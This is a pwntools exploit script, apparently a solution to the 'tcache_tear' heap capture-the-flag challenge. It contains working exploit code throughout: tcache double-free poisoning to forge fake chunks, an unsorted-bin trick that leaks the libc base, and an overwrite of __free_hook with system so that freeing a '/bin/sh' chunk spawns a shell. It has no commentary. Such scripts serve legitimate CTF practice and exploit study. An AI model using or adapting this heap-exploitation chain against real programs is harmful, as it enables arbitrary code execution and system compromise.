#!/usr/bin/python3

from pwn import *

exe = ELF('tcache_tear_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()

def create(size, data):
        sla(b"choice :", b"1")
        sla(b"Size:", size)
        sa(b"Data:", data)
def delete():
        sla(b"choice :", b"2")
def show():
        sla(b"choice :", b"3")
        
sa(b"Name:", b"a"*0x20)
create(b"112", b"a" * 100)
delete()
delete()
create(b"112", p64(0x602550))
create(b"112", p64(0x602550))
payload = flat(0,
               0x21,
               0, 0,
               0,
               0x21)
create(b"112", payload)

create(b"96", b"a" * 100)
delete()
delete()
create(b"96", p64(0x602050))
create(b"96", p64(0x602050))
payload = flat(0,
               0x501,
               0, 0,
               0, 0, 0,
               0x602060)
create(b"96", payload)
delete()

show()
p.recvuntil(b"Name :")
libc_leak = u64(p.recv(8))
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x3ebca0
info("libc base: " + hex(libc.address))

payload = b"a"
create(b"144", payload)
delete()
delete()
create(b"144", p64(libc.sym['__free_hook']))
create(b"144", p64(libc.sym['__free_hook']))
payload = flat(libc.sym['system'])
create(b"144", payload)
create(b"144", b"/bin/sh")

delete()

p.interactive()
